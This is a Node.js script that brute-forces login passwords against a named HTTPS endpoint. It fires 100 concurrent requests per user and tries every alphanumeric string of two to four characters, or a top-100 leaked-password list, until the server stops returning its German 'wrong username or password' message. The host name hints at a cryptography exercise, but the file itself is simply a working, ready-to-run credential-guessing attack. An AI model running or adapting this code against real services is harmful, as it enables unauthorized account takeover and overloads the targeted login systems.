const http = require('http')
const https = require('https')
const fs = require('fs')

const httpReq = (options, data = '', secure = true) => {
  if (typeof options === 'string') {
    secure = options.match(/^https/)
    const url = new URL(options)
    options = {
      method: 'GET',
      host: url.host,
      path: url.pathname + url.search,
      timeout: 10000
    }
  }
  let request
  const promise = new Promise((resolve, reject) => {
    const client = secure ? https : http
    request = client.request(options, res => {
      let data = ''
      res.on('error', err => {
        reject(err)
      })
      res.on('data', d => {
        data += d
      })
      res.on('end', () => {
        resolve({
          data: data,
          status: res.statusCode,
          headers: res.headers
        })
      })
    })
    request.write(data)
    request.on('error', err => {
      reject(err)
    })
    request.on('timeout', () => {
      reject(new Error('Timeout'))
    })
    request.end()
  })
  return { request, promise }
}

const attemptLogin = (baseUrl, username, password) => {
  const url = new URL(baseUrl)
  url.searchParams.set('benutzername', username)
  url.searchParams.set('passwort', password)

  const request = httpReq(url.toString())
  let cancel
  const promise = new Promise((resolve, reject) => {
    request.promise
      .then(result => {
        if (result.status !== 200) throw result
        resolve(!result.data.match(/benutzername oder passwort falsch/i))
      })
      .catch(reject)
    cancel = () => {
      try {
        request.request.destroy()
      } catch (err) {
        console.log(err)
      }
      reject('cancelled')
    }
  })
  return { request: request.request, promise, cancel }
}

const attemptMany = (urlBase, username, concurrentCount, nextCandidate) => {
  const beginTime = Date.now()
  let requestCounter = 0

  const logPerf = () => {
    const nowTime = Date.now()
    const msPassed = nowTime - beginTime
    const reqsPerSec = requestCounter / (msPassed / 1000)
    console.log(
      `User ${username}: Performed ${requestCounter} requests, ${reqsPerSec} requests/second`
    )
  }

  const perfLogInterval = setInterval(logPerf, 5000)

  let resolve
  let reject
  const promise = new Promise((_resolve, _reject) => {
    let done = false
    resolve = value => {
      if (!done) {
        done = true
        _resolve(value)
      }
    }
    reject = err => {
      if (!done) {
        done = true
        _reject(err)
      }
    }
  })

  let cancellers = []
  cancellers.push(() => clearInterval(perfLogInterval))
  const cancelAll = () => {
    while (cancellers.length > 0) {
      try {
        cancellers.pop()()
      } catch (err) {}
    }
  }
  const nextRequest = async candidate => {
    if (candidate) console.log('Retrying', candidate)
    candidate = candidate || nextCandidate()
    if (candidate === null) return
    //  console.log(candidate)
    const attempt = attemptLogin(urlBase, username, candidate)
    cancellers.push(attempt.cancel)
    let result
    let retry = false
    try {
      result = await attempt.promise
    } catch (err) {
      console.log(candidate, err)
      retry = true
    }
    if (result) {
      resolve(candidate)
      logPerf()
      cancelAll()
      return
    }
    requestCounter++
    cancellers = cancellers.filter(val => val !== attempt.cancel)
    nextRequest(retry ? candidate : null)
  }
  for (let i = 0; i < concurrentCount; i++) {
    nextRequest()
  }

  return promise
}

const intToString = (int, padLength, charSet) => {
  let radix = charSet.length
  let result = ''
  for (let i = 0; int > 0; i++) {
    let x = int % radix ** (i + 1)
    int -= x
    result = charSet[x / radix ** i] + result
  }
  if (result.length < padLength) result = charSet[0].repeat(padLength - result.length) + result
  return result
}

const getRandomPasswordGen = (charSet, length) => {
  let i = 0
  return () => {
    let j = i++
    if (j >= charSet.length ** length) return null
    return intToString(j, length, charSet)
  }
}

const readFromWordList = () => {
  const wordList = fs
    .readFileSync(__dirname + '/adobe-top100.txt')
    .toString('utf8')
    .split('\n')
    .filter(line => line)
    .map(line => line.trim())
  let i = 0
  return () => wordList[i++] ?? null
}

const alphanumCharSet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

let crackers = [
  { name: 'bob', next: getRandomPasswordGen(alphanumCharSet, 2) },
  { name: 'ute', next: getRandomPasswordGen(alphanumCharSet, 3) },
  { name: 'paul', next: getRandomPasswordGen(alphanumCharSet, 4) },
  { name: 'joe', next: readFromWordList() }
]

crackers = crackers.filter(v => v.name === 'paul')

const main = async () => {
  const baseUrl = 'https://krypto.dedyn.io/validate'
  for (let cracker of crackers) {
    let result

    try {
      result = await attemptMany(baseUrl, cracker.name, 100, cracker.next)
    } catch (err) {
      console.log(err)
      break
    }
    console.log(cracker.name, '; The password is', result)
  }
}

main()
